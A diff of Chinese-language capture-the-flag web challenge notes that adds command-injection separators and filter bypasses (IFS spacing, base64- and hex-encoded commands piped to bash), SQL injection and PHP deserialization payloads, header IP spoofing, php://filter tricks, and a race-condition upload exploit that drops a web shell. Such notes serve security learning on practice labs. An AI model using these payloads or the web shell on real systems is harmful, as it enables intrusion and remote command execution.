@@ -46,6 +46,74 @@
 
 [【BUUCTF】[GXYCTF2019] Ping Ping Ping 总结笔记 Writeup-CSDN博客](https://blog.csdn.net/vanarrow/article/details/108295481)
 
+命令联合执行：
+```sh
+;     前面的执行完执行后面的
+|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         
+||    当前面的执行出错时（为假）执行后面的
+&     将任务置于后台执行
+&&    前面的语句为假则直接出错，后面的也不执行，前面只能为真
+%0a  （换行）
+%0d  （回车）
+```
+
+命令绕过空格的方法：
+```sh
+${IFS}$9
+{IFS}
+$IFS
+${IFS}
+$IFS$1 //$1改成$加其他数字貌似都行
+IFS
+< 
+<> 
+{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来
+%20   (space)
+%09   (tab)
+X=$'cat\x09./flag.php';$X       （\x09表示tab，也可以用\x20）
+
+ps:有时会禁用cat:
+解决方法是使用tac反向输出命令：
+linux命令中可以加\，所以甚至可以ca\t /fl\ag
+
+```
+
+将`cat flag.php`转为base64编码后进行绕过:
+```
+Y2F0IGZsYWcucGhw
+```
+进行绕过：
+```sh
+?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash
+```
+
+其他的类似绕过
+```sh
+cat fl*  用*匹配任意 
+cat fla* 用*匹配任意
+ca\t fla\g.php        反斜线绕过
+cat fl''ag.php        两个单引号绕过
+echo "Y2F0IGZsYWcucGhw" | base64 -d | bash      
+//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数
+
+echo "63617420666c61672e706870" | xxd -r -p | bash       
+//hex编码绕过(引号可以去掉)
+
+echo "63617420666c61672e706870" | xxd -r -p | sh     
+//sh的效果和bash一样
+
+cat fl[a]g.php       用[]匹配
+
+a=fl;b=ag;cat $a$b          变量替换
+cp fla{g.php,G}    把flag.php复制为flaG
+ca${21}t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),${x}(x>=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 
+```
+
+常用的通配符如下：
+
+![](./img/通配符.png)
+
+
 ### 总结：
 
 使用到了命令绕过、内联执行等技术，参考题解中的ab变量使用进行绕过字符匹配或使用base64编码绕过明文匹配
@@ -662,7 +730,7 @@ https://www.nssctf.cn/problem/3429
 
 ```
 {
-			
+	
 	     		"checkcode":["a",
 "G",
 "r",
@@ -795,9 +863,11 @@ CSP 相关：
 [使用CSP防止XSS攻击 - 汕大小吴 - 博客园](https://www.cnblogs.com/wuguanglin/p/XSS.html)
 
 常用 XSS payload:
+
 ```
 onclick、onerror、alert
 ```
+
 ---
 
 ## [SWPUCTF 2021 新生赛]astJS
@@ -806,7 +876,7 @@ https://www.nssctf.cn/problem/409
 
 * 考点：JS
 * 工具：esgenerate，python
-  
+
 题目提供的文件是一个 json 文件，通过查看其内容可以猜测是一个编写的程序，发现其中的可疑字符串：
 
 ![](./img/JS-发现密文.png)
@@ -820,6 +890,7 @@ for i in c:
     flag+=chr(ord(i)^11)
 print(flag)
 ```
+
 发现是 flag
 
 通过查看 wp 发现另外一个方法是通过使用 esgenerate 直接将 json 转化为可执行的 js ，然后通过 node 执行：
@@ -832,13 +903,14 @@ print(flag)
 
 https://www.nssctf.cn/problem/3873
 
-* 考点：RCE，前端绕过，Linux命令  
+* 考点：RCE，前端绕过，Linux命令
 * 工具：hackbar
 
 由于过滤条件是写在 javascript 中的，所以只在通过网页输入访问时有效，只要通过数据包发送即可绕过过滤，使用hackbar构建 POST 请求包，body 为 `command= || cat /ls`
 即在ping命令执行失败后执行后面的 cat 指令，获得 flag
 
 ---
+
 ## SQL注入：
 
 ```
@@ -881,6 +953,7 @@ http://127.0.0.1/sqli-labs/Less-4/?id=-1") union select 1,2,3 --+
 
 
 ```
+
 ## [SWPUCTF 2021 新生赛]ez_unserialize
 
 https://www.nssctf.cn/problem/426
@@ -907,6 +980,7 @@ $obj->passwd = "ctf";
 echo urlencode(serialize($obj));
 ?>
 ```
+
 ---
 
 ## [SWPUCTF 2021 新生赛]no_wakeup
@@ -937,6 +1011,7 @@ O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
 将2修改为3
 
 如果成员变量不为 public，是 private ，则需要在类中进行修改
+
 ```php
 class Name{
     private $username = 'admin';
@@ -945,7 +1020,9 @@ class Name{
 $a=new Name();
 echo serialize($a)
 ```
+
 还需要注意序列化后的内容中的空格在构建 payload 传入参数后可能会丢失，需要使用 %00 替代空格补全
+
 ---
 
 ## [SWPUCTF 2022 新生赛]1z_unserialize
@@ -954,28 +1031,32 @@ https://www.nssctf.cn/problem/2883
 
 * 考点：反序列化,PHP,RCE
 * 工具：hackbar，php
-  
+
 这道题和前面的略有不同，需要自己构建命令获取 flag ，可以看到 lly 成员变量在括号中，所以可以直接构建 system 命令去攻击
 
 ```php
 class lyh{
     public $url = 'NSSCTF.com';
     public $lt;
-    public $lly;    
+    public $lly;  
 }
 $a= new lyh();
 $a->lt="system";
 $a->lly="cat /f*";
 echo serialize($a);
 ```
+
 其中有几点需要注意：
+
 - 创建新的对象的操作需要使用一个不和类名重名的名称
 - new 类名() 后要加()
 
 ---
 
+## 关于请求头：
 
-## 请求头中使用下面的指定来源 ip ：
+### 请求头中使用下面的指定来源 ip ：
+
 - X-Forwarded-For:127.0.0.1
 - Client-ip:127.0.0.1
 - X-Client-IP:127.0.0.1
@@ -987,9 +1068,10 @@ echo serialize($a);
 - X-Originating-IP:127.0.0.1
 - via:127.0.0.1
 
+### 指定来源域名
 
-## 指定来源域名
 - Referer:www.XXX.com 来源域名
+
 ---
 
 ## PHP伪协议的使用：
@@ -998,33 +1080,32 @@ echo serialize($a);
 2. http:// — 访问 HTTP(s) 网址
 3. ftp:// — 访问 FTP(s) URLs
 4. php:// — 访问各个输入/输出流（I/O streams）
-常用：
+   常用：
 
 将文件编码为 base64 后输出，绕过直接执行文件：
 
 `php://filter/read=convert.base64-encode/resource=index.php`
->利用 filter 协议读文件，将 index.php 通过 base64 编码后进行输出，这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做 php 文件执行了，而通过编码后则可以读取文件源码。
 
+> 利用 filter 协议读文件，将 index.php 通过 base64 编码后进行输出，这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做 php 文件执行了，而通过编码后则可以读取文件源码。
 
 strip_tags 绕过死亡 exit
 
 `php://filter/string.strip_tags|convert.base64-decode/resource=shell.php`
 
->这个<?php exit; ?>实际上是一个XML标签，既然是XML标签，就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。
-但是要写入的一句话木马也是 XML 标签，在用到 strip_tags 时也会被去除。
-注意到在写入文件的时候，filter是支持多个过滤器的。可以先将 webshell 经过 base64 编码， strip_tags 去除死亡 exit 之后，再通过 base64-decode 复原。
+> 这个 `<?php exit; ?>`实际上是一个XML标签，既然是XML标签，就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。
+> 但是要写入的一句话木马也是 XML 标签，在用到 strip_tags 时也会被去除。
+> 注意到在写入文件的时候，filter是支持多个过滤器的。可以先将 webshell 经过 base64 编码， strip_tags 去除死亡 exit 之后，再通过 base64-decode 复原。
 
 请求类型为 POST 则**不需要**对 resource 后的地址内容添加双引号
-
 
 5. zlib:// — 压缩流
 6. data:// — 数据（RFC 2397）
 7. glob:// — 查找匹配的文件路径模式
 8. phar:// — PHP 归档
-9.  ssh2:// — Secure Shell 2
-10.  rar:// — RAR
-11.  ogg:// — 音频流
-12.  expect:// — 处理交互式的流
+9. ssh2:// — Secure Shell 2
+10. rar:// — RAR
+11. ogg:// — 音频流
+12. expect:// — 处理交互式的流
 
 ---
 
@@ -1047,7 +1128,102 @@ https://www.nssctf.cn/problem/2421
 * 考点：条件竞争，php代码审计
 * 工具：php，yakit
 
-通过审计 php 代码可以发现其逻辑是从上传的参数 content 中读取 base64 编码的内容并解码，然后将解码得到的内容存入带有上传文件 md5 值的一个临时路径 `/tmp/md5值/下` 
+通过审计 php 代码可以发现其逻辑是从上传的参数 content 中读取 base64 编码的内容并解码，然后将解码得到的内容存入带有上传文件 md5 值的一个临时路径 `/tmp/md5值/下` ，然后通过对这个路径下的文件进行解压缩操作最后把解压缩的内容存入 `upload` 目录下；由于这个代码是在上传之后才对目录下的内容进行检测删除，所以可以通过条件竞争去访问已经上传了的 php 脚本，通过这个 php 脚本生成一个新的 php 攻击脚本(在另外的目录下，越过删除检查)
+网页源码如下：
 
+```php
+<?php
+highlight_file(__FILE__);
 
+function removedir($dir){
+    $list= scandir($dir);
+    foreach ($list as  $value) {
+       if(is_file($dir.'/'.$value)){
+         unlink($dir.'/'.$value);
+       }else if($value!="."&&$value!=".."){
+                removedir($dir.'/'.$value);
+       }
+    }
+}
 
+function unzip($filename){
+        $result = [];
+        $zip = new ZipArchive();
+        $zip->open($filename);
+        $dir = $_SERVER['DOCUMENT_ROOT']."/static/upload/".md5($filename);
+        if(!is_dir($dir)){
+            mkdir($dir);
+        }
+        if($zip->extractTo($dir)){
+        foreach (scandir($dir) as  $value) {
+            $file_ext=strrchr($value, '.');
+            $file_ext=strtolower($file_ext); //转换为小写
+            $file_ext=str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+            $file_ext=trim($file_ext); //收尾去空
+            if(is_dir($dir."/".$value)&&$value!="."&&$value!=".."){
+                removedir($dir);
+            }
+            if(!preg_match("/jpg|png|gif|jpeg/is",$file_ext)){
+                if(is_file($dir."/".$value)){
+                    unlink($dir."/".$value);
+                }else{
+                    if($value!="."&&$value!="..")
+                    array_push($result,$value);
+                }
+            
+            }
+       
+        }
+        $zip->close();
+        unlink($filename);
+        return json_encode($result);
+        }else{
+            return false;
+        }
+    }
+$content= $_REQUEST['content'];
+shell_exec('rm -rf /tmp/*');
+$fpath ="/tmp/".md5($content); 
+file_put_contents($fpath, base64_decode($content));
+echo unzip($fpath);
+    ?>
+```
+
+使用的攻击脚本如下：
+
+```php
+<?php
+        file_put_contents("../succ.php", '<?php system($_GET["cmd"]); ?>');
+?>
+```
+
+构建无用 png 的脚本如下：
+
+```python
+# create.py
+import os
+
+for i in range(100):
+    fn = 'a{}.png'.format(i)
+    os.system('echo "12" > {}'.format(fn))
+```
+
+计算相关 md5 路径的脚本如下:
+
+```python
+s = open('zipfile/z.zip', 'rb').read()
+import base64
+b64 = base64.b64encode(s)
+import urllib.parse
+print(urllib.parse.quote(b64))
+
+import hashlib
+
+md51 = hashlib.md5(b64).hexdigest()
+md52 = hashlib.md5(('/tmp/' + md51).encode('ascii')).hexdigest()
+
+print(md51)
+print(md52)
+```
+
+---
